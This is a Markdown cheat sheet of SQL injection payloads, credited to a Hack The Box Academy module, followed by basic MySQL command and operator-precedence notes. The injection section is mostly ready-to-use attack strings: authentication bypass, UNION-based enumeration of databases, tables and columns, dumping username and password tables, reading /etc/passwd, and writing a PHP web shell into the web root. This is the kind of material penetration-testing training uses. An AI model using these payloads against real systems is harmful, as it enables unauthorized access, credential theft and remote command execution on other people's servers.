# SQL Injection (thanks [academy.hackthebox.eu](https://academy.hackthebox.eu/module/details/33))

## Auth Bypass
```
admin' or  1 = 1 -- -
admin' or '1'='1
admin')-- -
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
```

## Union Injection
```
' order by 1-- -                                      Detect number of columns using order by
' UNION select 1,2,3-- -                              Detect number of columns using Union injection
' UNION select 1,@@version,3,4-- -                    Basic Union injection
' UNION select username, 2, 3, 4 from passwords-- -   Union injection for 4 columns
```

## DB Enumeration
```
' UNION SELECT 1,@@version,3,4-- -                 Fingerprint MySQL with query output
' UNION SELECT 1,SLEEP(5),3,4-- -                  Fingerprint MySQL with no output
' UNION select 1,database(),2,3-- -                Current database name

' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -                                       List all databases
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='users'-- -    List all tables in a specific database
' UNION select 1,COLUMN_NAME,TABLE_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='creds'-- -      List all columns in a specific table
' UNION select 1,username,password,4 from dev.credentials-- -                                               Dump data from a table in another database
```

## Privileges
```
' UNION SELECT 1,user(),3,4-- -                                            Find current user
' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user="root"-- -      Find if user has admin privileges
' UNION SELECT 1,grantee,privilege_type,is_grantable FROM information_schema.user_privileges WHERE user="root"-- -                   Find if all user privileges
' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -  Find which directories can be accessed through MySQL
```

## File Injection
```
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -                                    Read local file
' union select "file written successfully!" into outfile '/var/www/html/proof.txt'      Write a string to a local file
' union select "","<?php system($_REQUEST[0]); ?>","","" into outfile '/var/www/html/shell.php'-- -
```

# General SQL

## General
```
mysql -u <USER> -h <RHOST> -P <RPORT> -p
SHOW DATABASES;
USE <DATABASE>;
```

## Tables
```
CREATE TABLE logins (id INT, ...);
SHOW TABLES;
DESCRIBE logins;
INSERT INTO table_name VALUES (value_1,..);
INSERT INTO table_name(column2, ...) VALUES (column2_value, ..);
UPDATE table_name SET column1=newvalue1, ... WHERE <condition>;
```

## Columns
```
SELECT * FROM table_name;
SELECT column1, column2 FROM table_name;
DROP TABLE logins;
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
ALTER TABLE logins MODIFY oldColumn DATE;
ALTER TABLE logins DROP oldColumn;
```

## Output
```
SELECT * FROM logins ORDER BY column_1;
SELECT * FROM logins ORDER BY column_1 DESC;
SELECT * FROM logins ORDER BY column_1 DESC, id ASC;
SELECT * FROM logins LIMIT 2;
SELECT * FROM logins LIMIT 1, 2;
SELECT * FROM table_name WHERE <condition>;
SELECT * FROM logins WHERE username LIKE 'admin%';
```

## MySQL Operator Precedence
Division (/), Multiplication (*), and Modulus (%)
Addition (+) and Subtraction (-)
Comparison (=, >, <, <=, >=, !=, LIKE)
NOT (!)
AND (&&)
OR (||)
